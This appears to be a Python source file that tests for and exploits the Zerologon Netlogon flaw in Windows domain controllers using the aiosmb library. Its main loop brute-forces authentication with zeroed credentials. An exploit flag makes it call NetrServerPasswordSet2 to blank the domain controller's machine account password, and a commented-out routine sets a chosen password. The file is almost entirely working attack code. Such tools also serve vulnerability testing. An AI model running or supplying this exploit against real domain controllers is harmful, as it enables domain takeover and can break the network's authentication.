
import asyncio
from aiosmb.commons.connection.url import SMBConnectionURL
from aiosmb.commons.interfaces.machine import SMBMachine
from aiosmb.dcerpc.v5.interfaces.endpointmgr import EPM
from aiosmb.dcerpc.v5 import nrpc
from struct import pack, unpack
from aiosmb import logger

MAX_ATTEMPTS = 255

#async def pwreset(url_str):
#	password = bytes.fromhex('7c427e53b318ac85c0f35b28dc13a505e11e56cd1eca85f29193fb856e2bf0c92a4c4804a96f6483de18346c72a7bf281394b928232ffd4a7112a9e893ec8da28b9a97e06fe72ef3a0ebb032c0e87b3c697cf8f0a44c226bd711442e825cef593b607cdaf8b72c5934c58e5287bcd2e2246e741e3cacf02e80781089ecf129a2245666a2b55ccee7801a9f007ba7f2760783127c1a33ab9c0e2e228d7bf0e84e6250c377ac2c2432a6ed3793f472a5dbe09d2c93697e271512afccf18f38d482feaf23a3f1c3bf87eb0dd90985c2c7b73d624d7b8d46e048ece053eaee28a2ee43f66be18b0ae4ba8311169b6c399a00')
#	exploit = True
#	dc_name = 'WIN2019AD'
#	dc_handle = '\\\\' + dc_name
#	dc_ip = '10.10.10.2'
#	target_computer = 'WIN2019AD' #without $
#
#	plaintext = b'\x00' * 8
#	ciphertext = b'\x00' * 8
#
#	# Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
#	flags = 0x212fffff
#
#	url = SMBConnectionURL(url_str)
#	connection = url.get_connection()
#
#
#	epm = EPM(connection, protocol = 'ncacn_ip_tcp')
#	_, err = await epm.connect()
#	if err is not None:
#		raise err
#	stringBinding, err = await epm.map(nrpc.MSRPC_UUID_NRPC)
#	_, err = await epm.connect()
#	if err is not None:
#		raise err
#
#	dce = epm.get_connection_from_stringbinding(stringBinding)
#	#dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
#
#	_, err = await dce.connect()
#	if err is not None:
#		raise err
#	_, err = await dce.bind(nrpc.MSRPC_UUID_NRPC)
#	if err is not None:
#		raise err
#
#	resp, err = await nrpc.hNetrServerReqChallenge(dce, dc_handle + '\x00', target_computer + '\x00', plaintext)
#	if err is not None:
#		raise err
#	
#	serverChallenge = resp['ServerChallenge']
#	# Empty at this point
#	sessionKey = nrpc.ComputeSessionKeyAES(b'', b'12345678', serverChallenge)
#	ciphertext = nrpc.ComputeNetlogonCredentialAES(b'12345678', sessionKey)
#
#	_, err = await nrpc.hNetrServerAuthenticate3(
#		dce, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
#		target_computer + '\x00', ciphertext, flags
#	)
#	if err is not None:
#		if str(err).find('STATUS_DOWNGRADE_DETECTED') < 0:
#			raise err
#
#	clientStoredCredential = pack('<Q', unpack('<Q',ciphertext)[0] + 10)
#
#	indata = b'\x00' * (512-len(password)) + password + pack('<L', len(password))
#
#	_, err = await nrpc.hNetrServerPasswordSet2(
#		dce, '\\\\' + target_computer + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
#		target_computer + '\x00', update_authenticator(clientStoredCredential, sessionKey), nrpc.ComputeNetlogonCredentialAES(indata, sessionKey)
#	)
#	if err is not None:
#		raise err
#
#	print('Change password OK')

def update_authenticator(clientStoredCredential, sessionKey, plus=10):
	authenticator = nrpc.NETLOGON_AUTHENTICATOR()
	authenticator['Credential'] = nrpc.ComputeNetlogonCredentialAES(clientStoredCredential, sessionKey)
	authenticator['Timestamp'] = plus
	return authenticator


async def run(dc_name, dc_ip, exploit = False):
	#exploit = True
	#dc_name = 'WIN2019AD'
	dc_handle = '\\\\' + dc_name
	#dc_ip = '10.10.10.2'
	target_computer = dc_name #without $

	plaintext = b'\x00' * 8
	ciphertext = b'\x00' * 8

	# Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
	flags = 0x212fffff

	url = SMBConnectionURL('smb2+ntlm-password://XXX\\aaa:aaa@%s' % dc_name) # dummy url to speed up the process..
	connection = url.get_connection()

	async with connection:
		epm = EPM(connection, protocol = 'ncacn_ip_tcp')
		_, err = await epm.connect()
		if err is not None:
			raise err
		stringBinding, err = await epm.map(nrpc.MSRPC_UUID_NRPC)
		_, err = await epm.connect()
		if err is not None:
			raise err

		dce = epm.get_connection_from_stringbinding(stringBinding)
		#dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

		_, err = await dce.connect()
		if err is not None:
			raise err
		_, err = await dce.bind(nrpc.MSRPC_UUID_NRPC)
		if err is not None:
			raise err

		for _ in range(0, MAX_ATTEMPTS):
			print('=====================================================')
			_, err = await nrpc.hNetrServerReqChallenge(dce, dc_handle + '\x00', target_computer + '\x00', plaintext)
			if err is not None:
				raise err
			
			if exploit is False:
				server_auth, err = await nrpc.hNetrServerAuthenticate3(
					dce, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
					target_computer + '\x00', ciphertext, flags
				)
			else:
				authenticator = nrpc.NETLOGON_AUTHENTICATOR()
				authenticator['Credential'] = b'\x00' * 8
				authenticator['Timestamp'] = 0
				server_auth, err = await nrpc.hNetrServerPasswordSet2(
					dce, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, 
					target_computer + '\x00', authenticator, b'\x00' * 516
				)


			if err is not None:
				if err.get_error_code() == 0xc0000022:
					continue
				else:
					raise err
			
			if server_auth['ErrorCode'] == 0:
				print('Server is vulnerable!')
				break
		
		else:
			print('FAILED!')

		await dce.disconnect()

def main():
	import argparse
	import platform
	import logging
	from asysocks import logger as sockslogger

	
	parser = argparse.ArgumentParser(description='Zerologon tester')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('-e', '--exploit', action='store_true', help='perform the expolit')
	parser.add_argument('dc_ip', help = 'IP address of the domain controller')
	parser.add_argument('dc_name', help = 'NETBIOS NAME of the domain controller (without $)')
	
	
	args = parser.parse_args()
	if args.verbose >=1:
		logger.setLevel(logging.DEBUG)

	if args.verbose > 2:
		print('setting deepdebug')
		logger.setLevel(1) #enabling deep debug
		sockslogger.setLevel(1)
		asyncio.get_event_loop().set_debug(True)
		logging.basicConfig(level=logging.DEBUG)

	asyncio.run(run(args.dc_name, args.dc_ip, args.exploit))

if __name__ == '__main__':
	main()